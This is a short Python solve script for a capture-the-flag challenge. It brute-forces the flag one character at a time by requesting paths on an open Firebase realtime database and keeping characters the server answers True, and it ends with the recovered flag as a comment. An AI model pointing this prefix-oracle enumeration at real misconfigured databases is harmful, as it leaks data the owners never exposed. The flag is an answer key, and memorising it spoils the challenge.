import requests 
from tqdm import tqdm
from urllib.parse import quote 
#flag = 'UDCTF{'
flag = 'UDCTF{1ce_L4br4t0ry_s3C0nd_Fl0or_b0y'
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}!"%&\'()*+,-.:;<=>?@[\\]/^`|~ \t\n\r\x0b\x0c'
while flag[-1] != '}':
    for c in tqdm(charset):
        r = requests.get(f'https://best-bathroom-default-rtdb.firebaseio.com/flag/{quote(flag+c)}.json').json()
        if r == True:
            flag += c 
            break 
        elif r != None:
            print(r)
    print(flag)
print(flag)

# UDCTF{1ce_L4br4t0ry_s3C0nd_Fl0or_b0y's_b4thr00m}

